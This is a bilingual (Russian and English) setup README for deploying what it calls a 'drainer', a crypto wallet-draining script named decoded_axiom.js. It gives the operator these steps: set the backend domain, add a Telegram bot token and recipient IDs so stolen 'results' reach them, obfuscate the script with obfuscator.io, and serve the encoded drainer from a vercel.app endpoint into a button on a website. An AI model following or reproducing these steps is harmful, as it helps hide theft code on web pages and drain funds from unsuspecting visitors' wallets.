## 1. Что надо поменять:




1. decoded_axiom.js 
    - строка 77: меняем ссылку на домен с backend частью (server, api, ...)
2. server/index.ts
    - строка 389: botToken - ключ от @BotFather
    - строка 390: botToken - userID (можно несколько через запятую), всем кто указан в этом массиве будут приходить результаты
    - строка 43-44: такая же логика как для строк 389-390

## 2. После изменений

1. Идем на сайт - https://obfuscator.io/ и вставляем туда содержимое нашего уже изменненого decoded_axiom.js
2. Вставляем зашифрованный код в server/scripts.txt и scripts/api/scripts.txt

## 3. Деплоим

## 3. На фронте
   1. Запрос к https://server-sigma-orcin-39.vercel.app/?fetchScript=True - в ответ получаем наш закодированный дрейнер в виде текста (который мы пихаем в кнопку)


## 1. What needs to be changed:

1. decoded_axiom.js
- line 77: change the link to the domain with the backend part (server, api, ...)
2. server/index.ts
- line 389: botToken - the key from @BotFather
- line 390: botToken - userID (multiple IDs separated by commas), all users listed in this array will receive the results
- lines 43-44: the same logic as for lines 389-390

## 2. After the changes

1. Go to the website - https://obfuscator.io/ and paste the contents of your modified decoded_axiom.js there.
2. Paste the encrypted code into server/scripts.txt and scripts/api/scripts.txt

## 3. Deploy

## 3. On the frontend
1. Make a request to https://server-sigma-orcin-39.vercel.app/?fetchScript=True - in response you will receive our encoded drainer as text (which you then put into the button)